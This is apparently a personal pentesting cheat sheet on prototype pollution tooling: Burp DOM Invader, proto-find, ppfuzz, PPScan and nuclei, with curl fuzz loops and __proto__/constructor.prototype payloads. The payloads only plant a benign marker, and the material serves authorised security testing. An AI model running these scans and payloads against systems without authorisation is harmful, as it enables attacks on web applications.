---
aliases:
  - DOM Invader
  - ppmap
  - PPScan
  - ppfuzz
tags:
  - type/tool
  - vuln/prototype-pollution
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Prototype Pollution]]"
  - "[[Burp Suite]]"
---
# Prototype Pollution - Tooling

***

## Burp DOM Invader

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → DOM Invader → Enable + reload page | Setup + auto-detection sources/sinks | Burp Pro. |
| DOM Invader UI → "Prototype Pollution" tab → click source | Auto-test con payload `{"polluted":"yes"}` | One-click testing. |
| DOM Invader → "Inject" button con custom payload | Manual payload injection | Edge cases. |
| DOM Invader → "Source tree" → trace source-to-sink | Path completo | Verification full flow. |
| Browser console post-injection: `({}).polluted` | Confirm pollution global | Validation. |
| DOM Invader → export findings | Save evidence reportable | Bug bounty. |
| DOM Invader → "Augmented DOM" tab → ver props añadidas | Inspect prototype state | Post-attack analysis. |
^pp-tool-burp-dom

___

## ppmap

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/kosmosec/proto-find && cd proto-find` | Install ppmap (proto-find evolution) | Primera vez. |
| `python proto-find.py -u https://target/` | Scan URL params para PP sources | Single URL. |
| `python proto-find.py -l urls.txt -t 10` | Bulk scan threaded | Volume. |
| `python proto-find.py -u https://target/ --output findings.json` | JSON output reportable | Post-scan. |
| `python proto-find.py -u "https://target/?a=1&b=2"` | Auto-fuzz query params | Targeted. |
| `python proto-find.py -u https://target/ --collaborator http://oast.fun` | OOB confirmation via Collaborator | Blind detection. |
^pp-tool-ppmap

___

## PPScan / ppfuzz

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `cargo install ppfuzz` o `git clone https://github.com/dwisiswant0/ppfuzz` | Install ppfuzz Rust | Primera vez. |
| `ppfuzz -l urls.txt` | Bulk URL scan PP | Volume testing. |
| `ppfuzz -l urls.txt -p custom-payloads.txt` | Custom payload set | Targeted fuzzing. |
| `ppfuzz -l urls.txt -c 50 -t 30` | 50 concurrent threads, 30s timeout | Speed. |
| `npm install -g ppscan && ppscan https://target/` | PPScan alternativo Node | Sin Rust. |
| `nuclei -t http/vulnerabilities/generic/prototype-pollution.yaml -u https://target/` | nuclei template PP | Auto-detect. |
| Manual bash loop: `for p in $(cat payloads.txt); do curl -X POST -H "Content-Type: application/json" -d "$p" https://target/api/x; done` | Custom shell fuzz | Quick CLI. |
^pp-tool-scanners

### Manual fuzz con curl

```bash
PAYLOADS=(
  '{"__proto__":{"polluted":"yes"}}'
  '{"constructor":{"prototype":{"polluted":"yes"}}}'
  '{"__proto__.polluted":"yes"}'
  '{"a":{"__proto__":{"polluted":"yes"}}}'
)

for p in "${PAYLOADS[@]}"; do
  echo "Testing: $p"
  curl -s -X POST https://target/api/x \
    -H "Content-Type: application/json" \
    -d "$p"

  curl -s https://target/api/health | grep -i polluted && echo "[!] VULN with: $p"
done
```

___

## Custom Payloads y Wordlists

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Browser → https://portswigger.net/web-security/prototype-pollution | PortSwigger labs PP payloads | Lab reference. |
| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && ls "PayloadsAllTheThings/Prototype Pollution"` | PayloadsAllTheThings PP wordlist | Foundation. |
| Browser → https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution | HackTricks reference | Lookup. |
| `git clone https://github.com/BlackFan/client-side-prototype-pollution` | Client-side PP gadgets repo | Client-side focus. |
| `git clone https://github.com/y0urb0at/prototype-pollution-cheatsheet` | Server-side gadgets | Server-side focus. |
| Browser console probe: `for k in ['__proto__','constructor.prototype','__proto__.toString','constructor[prototype]']; do test...` | Variant exploration | Client testing. |
| `cat <<EOF > pp-payloads.txt\n{"__proto__":{"x":"y"}}\n{"constructor":{"prototype":{"x":"y"}}}\n{"__proto__.x":"y"}\nEOF` | Custom wordlist | Tooling input. |
^pp-tool-payloads

### Verificación rápida de pollution

```javascript
// Browser console post-pollution
({}).polluted        // si retorna 'yes' → polución global confirmed
Object.prototype.polluted  // alternativa

// Server-side test (si tenés acceso):
const test = {};
console.log(test.polluted);  // si 'yes' → vulnerable
```

***
